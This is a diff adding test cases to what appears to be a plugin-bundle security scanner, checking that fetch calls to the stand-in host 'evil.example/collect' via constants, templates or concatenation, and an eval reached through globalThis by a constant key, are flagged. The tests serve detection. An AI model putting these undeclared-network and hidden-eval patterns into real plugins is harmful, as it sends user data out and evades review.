@@ -296,6 +296,87 @@ describe('calls through an alias (AGL-1090)', () => {
   })
 })
 
+describe('a URL held in a constant (AGL-1093)', () => {
+  const statusOf = (result: ReturnType<typeof checkPluginBundle>) =>
+    result.checks.find((check) => check.id === 'network')?.status
+  const check = (body: string, network: string[] = ['https://api.example.com']) =>
+    checkPluginBundle(`${body}\nexport function register() {}\n`, {
+      declaredNetwork: network,
+    })
+
+  it('reads a plain constant — the idiomatic way to write a request', () => {
+    // This used to be a `question` row, which meant the network diff quietly
+    // did not run for the bundles most likely to be honest.
+    const result = check(
+      `const ENDPOINT = 'https://evil.example/collect'\nfetch(ENDPOINT)`,
+    )
+    expect(result.ok).toBe(false)
+    expect(
+      result.problems.some((p) => p.message.includes('https://evil.example')),
+    ).toBe(true)
+  })
+
+  it('reads a template and a concatenation built from constants', () => {
+    expect(
+      check(`const BASE = 'https://evil.example'\nfetch(\`\${BASE}/zen\`)`).ok,
+    ).toBe(false)
+    expect(
+      check(
+        `const BASE = 'https://evil.example'\nconst U = BASE + '/p'\nfetch(U)`,
+      ).ok,
+    ).toBe(false)
+  })
+
+  it('passes a declared origin reached through a constant', () => {
+    const result = check(
+      `const ENDPOINT = 'https://api.example.com/v1'\nfetch(ENDPOINT)`,
+    )
+    expect(result.ok).toBe(true)
+    expect(statusOf(result)).toBe('pass')
+    expect(
+      result.checks.find((c) => c.id === 'network')?.detail,
+    ).toContain('https://api.example.com (declared)')
+  })
+
+  it('resolves a property name held in a constant too', () => {
+    const result = check(`const KEY = 'eval'\nconst g = globalThis\ng[KEY]('1')`)
+    expect(result.ok).toBe(false)
+    expect(result.problems.some((p) => p.check === 'code-execution')).toBe(true)
+  })
+
+  it('refuses to guess a name that is reassigned', () => {
+    // Two values, one name: the value at the call site is not knowable, and
+    // guessing either one would be a claim about code it did not read.
+    const result = check(
+      `let url = 'https://api.example.com'\n` +
+        `if (Date.now() > 0) url = 'https://evil.example'\n` +
+        `fetch(url)`,
+    )
+    expect(statusOf(result)).toBe('question')
+    expect(
+      result.problems.some((p) => p.message.includes('only known at runtime')),
+    ).toBe(true)
+  })
+
+  it('refuses to guess a name a parameter shadows', () => {
+    const result = check(
+      `const u = 'https://api.example.com/ok'\n` +
+        `const send = (u) => fetch(u)\n` +
+        `send(location.href)`,
+    )
+    expect(statusOf(result)).toBe('question')
+  })
+
+  it('refuses to guess a name declared twice', () => {
+    const result = check(
+      `{ const u = 'https://api.example.com' }\n` +
+        `{ const u = 'https://evil.example' }\n` +
+        `const send = () => fetch(u)`,
+    )
+    expect(statusOf(result)).toBe('question')
+  })
+})
+
 describe('a URL handed to a call nobody could follow (AGL-1090)', () => {
   const statusOf = (result: ReturnType<typeof checkPluginBundle>) =>
     result.checks.find((check) => check.id === 'network')?.status
